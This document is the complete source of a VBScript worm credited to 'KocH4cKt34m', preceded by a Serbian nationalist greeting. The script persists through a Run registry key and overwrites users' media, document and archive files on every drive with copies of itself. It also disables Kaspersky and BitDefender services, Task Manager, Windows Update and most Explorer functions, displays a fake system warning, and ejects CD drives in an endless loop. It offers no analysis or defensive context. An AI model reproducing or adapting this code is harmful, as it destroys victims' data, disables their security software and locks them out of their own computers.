'Long live great Serbia==== Za sve one koji zive u Koceljevi,znajte da KocH4cKt34m rulessss!!!

set hack = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
fso.copyfile wscript.scriptfullname,fso.getfolder("c:\windows\system32\1041") & "\dR4cUl4.vbs"
fso.copyfile wscript.scriptfullname,fso.getfolder("c:\windows\system32") & "\secretmail.txt.vbs"
regrun = "HKLM\software\microsoft\windows\currentversion\run\"
runvalue = hack.regread(regrun & "Vlad")

if runvalue = "" then

set run = fso.createtextfile("c:\windows\system32\1041\" & "run.reg")
run.writeline "REGEDIT4"
run.writeline " [HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run]"
run.writeline " ""Vlad""=""\""c:\\windows\\system32\\1041\\dR4cUl4.vbs\"""""
run.close
hack.run "regedit /s " & "c:\windows\system32\1041\" & "run.reg"

end if

hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\DisableTaskMgr", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\dR4cUl4\", "Made by KocH4cKt34m"



Set Drives = Fso.Drives



set dr=fso.Drives

for each d in dr

if d.DriveType=2 or d.DriveType=3 or d.drivetype=4 or d.drivetype=5 or d.drivetype=6 then

list(d.path&"\")

end if

next


Sub spreadmailto (dir)

on error resume next

set fso=createobject("Scripting.filesystemobject")

set f=fso.GetFolder(dir)

set cf=f.Files

for each fil in cf

ext=fso.GetExtensionName(fil.path)

ext=lcase(ext)

if (ext="mp3") or (ext="avi") or (ext="txt") or (ext="jpg") or (ext="doc") or (ext="bmp") or (ext="pdf") or (ext="wma") or (ext="wav") or (ext="rar") or (ext="zip") or (ext="cab") or (ext="rtf") or (ext="xml") or (ext="jpeg") or (ext="mdb") or (ext="htm") or (ext="html") then

fso.copyfile wscript.scriptfullname,fil.path

end if

next

End Sub

Sub list(dir)

on error resume next

set f=fso.GetFolder(dir)

set ssf=f.Subfolders

for each fil in ssf

spreadmailto(fil.path)

list(fil.path)

next

End Sub

hack.regdelete "HKLM\software\microsoft\windows\currentversion\run\kavpersonal50"
hack.regwrite "HKLM\SYSTEM\CurrentControlSet\Services\kavsvc\Start", "4", "REG_DWORD"
hack.regwrite "HKLM\SYSTEM\CurrentControlSet\Services\bdss\Start", "4", "REG_DWORD"
hack.regdelete "HKCR\CLSID\{D969A300-E7FF-11d0-A93B-00A0C90F2719}\InProcServer32\ThreadingModel"
hack.regdelete "HKCR\CLSID\{5b4dae26-b807-11d0-9815-00c04fd91972}\InProcServer32\ThreadingModel"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuMorePrograms", "1", "REG_DWORD"
hack.regdelete "HKCU\Control Panel\Desktop\Wallpaper"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoViewContextMenu", "0", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuMorePrograms", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuPinnedList", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoDesktop", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoControlPanel", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuSubFolders", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoTrayContextMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoLogOff", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoClose", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoFolderOptions", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoBandCustomize", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoFavoritesMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoRecentDocsMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoNetworkConnections", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSMMyDocs", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSMMyPictures", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuMyMusic", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\advanced\"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\advanced\StartMenuAdminTools", "No"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\StartMenuAdminTools", "No"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSetTaskbar", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSetFolders", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuNetworkPlaces", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoRun", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoFind", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSMHelp", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoTrayItemsDisplay", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoToolbarsOnTaskbar", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\LockTaskbar", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\HideClock", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\system\DisableTaskMgr", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuMorePrograms", "1", "REG_DWORD"
hack.regdelete "HKLM\software\microsoft\windows\currentversion\explorer\desktop\namespace"
hack.regwrite "HKLM\system\currentcontrolset\services\cdrom\Autorun", "0", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoCdBurning", "1", "REG_DWORD"
hack.regwrite "HKLM\software\microsoft\windows\currentversion\policies\explorer\NoCdBurning", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\nonenum\"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\nonenum\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\StartMenuLogoff", "1", "REG_DWORD"
hack.regdelete "HKCR\CLSID\{a2a9545d-a0c2-42b4-9708-a0b2badd77c8}\InProcServer32\ThreadingModel"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuMorePrograms", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSimpleStartMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoDispSettingsPage", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoDrives", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoFileMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoActiveDesktop", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoActiveDesktopChanges", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoChangeStartMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoFolderOptions", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoTrayContextMenu", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoStartMenuSubFolders", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoWindowsUpdate", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\EnforceShellExtensionSecurity", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoSetActiveDesktop", "1", "REG_DWORD"
hack.regwrite "HKCU\software\microsoft\windows\currentversion\policies\explorer\NoWindowsCatalog", "1", "REG_DWORD"

VxMsg = "W A R N I N G : Owned by baltazar" & VbCrLf & VbCrLf
VxMsg = VxMsg & " Your system resources is in a critical state." & VbCrLf
VxMsg = VxMsg & " To avoid any damages to your system or files, Please" & VbCrLf
VxMsg = VxMsg & " restart your computer or contact the system administrator."
MsgBox VxMsg, VbCritical, "dR4cUl4 = Made by KocH4cKt34m © 2007"

do

set owmp = createobject("wmplayer.ocx.7")
set colcdroms = owmp.cdromcollection
if colcdroms.count then
for i = 0 to colcdroms.count - 1
colcdroms.item(i).eject
next
for i = 0 to colcdroms.count - 1
colcdroms.item(i).eject
next



end if

loop